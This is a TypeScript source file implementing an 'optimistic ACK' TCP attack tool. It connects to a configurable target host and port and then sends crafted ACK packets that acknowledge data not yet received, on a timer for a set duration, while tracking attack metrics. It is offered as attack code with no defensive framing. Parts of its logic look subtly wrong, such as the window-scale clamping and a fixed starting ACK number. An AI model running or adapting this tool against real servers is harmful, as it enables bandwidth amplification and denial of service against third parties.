import { RawSocketManager } from './RawSocketManager';
import { PacketCrafter } from './PacketCrafter';
import * as net from 'net';

export interface AttackConfig {
  targetHost: string;
  targetPort: number;
  attackDuration: number; // seconds
  packetInterval: number; // milliseconds
  ackAdvanceSize: number; // bytes
  windowScale: number;
}

export interface AttackMetrics {
  packetsPressed: number;
  successfulAcks: number;
  connectionEstablished: boolean;
  attackStartTime: number;
  currentSpeed: number; // bytes/sec
  totalDataTransferred: number;
}

export class OptimisticACKAttacker {
  private config: AttackConfig;
  private rawSocket: RawSocketManager;
  private packetCrafter: PacketCrafter;
  private attackTimer: NodeJS.Timeout | null = null;
  private sequenceNumber: number = 0;
  private ackNumber: number = 0;
  private metrics: AttackMetrics;
  private connection: net.Socket | null = null;
  private isAttackActive: boolean = false;

  constructor(config: AttackConfig) {
    this.config = config;
    this.rawSocket = new RawSocketManager();
    this.packetCrafter = new PacketCrafter();
    this.metrics = {
      packetsPressed: 0,
      successfulAcks: 0,
      connectionEstablished: false,
      attackStartTime: 0,
      currentSpeed: 0,
      totalDataTransferred: 0
    };

    // Validate and sanitize configuration
    this.validateConfig();
  }

  private validateConfig(): void {
    // Ensure window scale doesn't create values > 65535
    if (this.config.windowScale > 1) {
      const maxWindowSize = 65535 * this.config.windowScale;
      if (maxWindowSize > 65535) {
        console.warn(`Window scale ${this.config.windowScale} would exceed 16-bit limit. Adjusting to safe value.`);
        this.config.windowScale = Math.floor(65535 / 32768); // Conservative scaling
      }
    }

    // Ensure other values are within reasonable bounds
    this.config.targetPort = Math.max(1, Math.min(65535, this.config.targetPort));
    this.config.packetInterval = Math.max(1, this.config.packetInterval);
    this.config.ackAdvanceSize = Math.max(1, this.config.ackAdvanceSize);
    this.config.attackDuration = Math.max(1, this.config.attackDuration);
  }

  public async executeAttack(): Promise<void> {
    try {
      console.log('Starting Optimistic ACK Attack...');
      this.metrics.attackStartTime = Date.now();
      this.isAttackActive = true;

      // Step 1: Establish TCP connection
      await this.establishConnection();

      // Step 2: Start optimistic ACK attack
      await this.startOptimisticACKLoop();

    } catch (error) {
      console.error('Attack execution failed:', error);
      throw error;
    }
  }

  private async establishConnection(): Promise<void> {
    console.log(`Establishing TCP connection to ${this.config.targetHost}:${this.config.targetPort}...`);
    
    try {
      this.connection = await this.rawSocket.establishConnection(
        this.config.targetHost,
        this.config.targetPort
      );
      
      this.metrics.connectionEstablished = true;
      
      // Generate initial sequence numbers
      this.sequenceNumber = Math.floor(Math.random() * 1000000);
      this.ackNumber = 1;

      console.log('TCP connection established successfully');
    } catch (error) {
      console.error('Failed to establish connection:', error);
      throw error;
    }
  }

  private async startOptimisticACKLoop(): Promise<void> {
    const attackDuration = this.config.attackDuration * 1000;
    const startTime = Date.now();

    return new Promise((resolve) => {
      this.attackTimer = setInterval(async () => {
        try {
          if (!this.isAttackActive) {
            this.stopAttack();
            resolve();
            return;
          }

          await this.sendOptimisticACK();
          this.updateMetrics();
          
          // Check if attack duration exceeded
          if (Date.now() - startTime >= attackDuration) {
            this.stopAttack();
            resolve();
          }
        } catch (error) {
          console.error('Error in attack loop:', error);
          // Don't stop the attack for individual packet errors
        }
      }, this.config.packetInterval);
    });
  }

  private async sendOptimisticACK(): Promise<void> {
    // Advance ACK number optimistically (more than what was actually received)
    this.ackNumber += this.config.ackAdvanceSize;
    
    // Calculate window size with proper bounds checking
    const baseWindowSize = 32768; // Start with a reasonable base
    let windowSize = baseWindowSize;
    
    if (this.config.windowScale > 1) {
      // Apply window scaling, but ensure it doesn't exceed 16-bit limit
      windowSize = Math.min(65535, baseWindowSize * this.config.windowScale);
    }
    
    const optimisticACK = this.packetCrafter.createOptimisticACKPacket(
      this.config.targetHost,
      this.config.targetPort,
      this.sequenceNumber,
      this.ackNumber,
      windowSize
    );

    await this.rawSocket.sendPacket(optimisticACK);
    this.metrics.packetsPressed++;
    this.metrics.successfulAcks++;
    
    console.log(`Optimistic ACK sent: seq=${this.sequenceNumber}, ack=${this.ackNumber}, window=${windowSize}`);
  }

  private updateMetrics(): void {
    const elapsed = (Date.now() - this.metrics.attackStartTime) / 1000;
    this.metrics.currentSpeed = elapsed > 0 ? this.metrics.totalDataTransferred / elapsed : 0;
    this.metrics.totalDataTransferred += this.config.ackAdvanceSize;
  }

  public getMetrics(): AttackMetrics {
    return { ...this.metrics };
  }

  public stopAttack(): void {
    this.isAttackActive = false;
    
    if (this.attackTimer) {
      clearInterval(this.attackTimer);
      this.attackTimer = null;
    }

    if (this.connection) {
      this.connection.destroy();
      this.connection = null;
    }

    this.rawSocket.close();
    console.log('Optimistic ACK attack stopped');
  }

  public isActive(): boolean {
    return this.isAttackActive;
  }
}